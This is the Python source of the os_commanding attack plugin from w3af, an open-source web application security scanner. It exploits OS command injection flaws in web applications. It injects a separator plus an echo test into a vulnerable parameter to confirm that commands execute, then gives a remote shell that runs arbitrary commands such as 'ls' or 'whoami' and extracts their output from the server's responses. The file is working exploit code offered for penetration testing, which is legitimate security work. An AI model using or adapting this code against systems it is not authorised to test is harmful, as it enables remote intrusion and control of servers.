'''
os_commanding.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import core.controllers.output_manager as om

from core.data.kb.exec_shell import ExecShell
from core.data.fuzzer.utils import rand_alpha

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException

from plugins.attack.payloads.decorators.exec_decorator import exec_debug


class os_commanding(AttackPlugin):
    '''
    Exploit OS Commanding vulnerabilities.

    @author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)

    def get_attack_type(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'

    def get_kb_location(self):
        '''
        This method should return the vulnerability names (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds a
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        (attack.os_commanding) should return ['os_commanding',] in this method.
        
        If there is more than one location the implementation should return
        ['a', 'b', ..., 'n']
        '''
        return ['os_commanding',]

    def _generate_shell(self, vuln):
        '''
        @param vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as
                 parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verify_vuln(vuln):
            # Create the shell object
            shell_obj = OSCommandingShell(vuln, self._uri_opener,
                                          self.worker_pool,
                                          self._header_length,
                                          self._footer_length)
            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # The vuln was saved to the kb as:
        # kb.kb.append( self, 'os_commanding', v )
        exploit_dc = vuln.get_dc()

        # Define a test command:
        rand = rand_alpha(8)
        if vuln['os'] == 'windows':
            command = vuln['separator'] + 'echo ' + rand
            # TODO: Confirm that this works in windows
            rand = rand + '\n\n'
        else:
            command = vuln['separator'] + '/bin/echo ' + rand
            rand = rand + '\n'

        # Lets define the result header and footer.
        func_ref = getattr(self._uri_opener, vuln.get_method())
        exploit_dc[vuln.get_var()] = command
        try:
            response = func_ref(vuln.get_url(), str(exploit_dc))
        except w3afException, e:
            om.out.error(str(e))
            return False
        else:
            return self._define_exact_cut(response.get_body(), rand)

    def get_root_probability(self):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.8

    def get_long_desc(self):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits os commanding vulnerabilities and returns a remote shell.
        '''


class OSCommandingShell(ExecShell):

    def __init__(self, vuln, url_opener, worker_pool, header_len, footer_len):
        super(OSCommandingShell, self).__init__(vuln, url_opener, worker_pool)

        self.set_cut(header_len, footer_len)

    @exec_debug
    def execute(self, command):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @param command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        func_ref = getattr(self._uri_opener, self.get_method())
        exploit_dc = self.get_dc()
        exploit_dc[self.get_var()] = self['separator'] + command
        try:
            response = func_ref(self.get_url(), str(exploit_dc))
        except w3afException, e:
            msg = 'Error "%s" while sending command to remote host. Please '\
                  'try again.'
            return msg % e
        else:
            return self._cut(response.get_body())

    def get_name(self):
        return 'os_commanding'
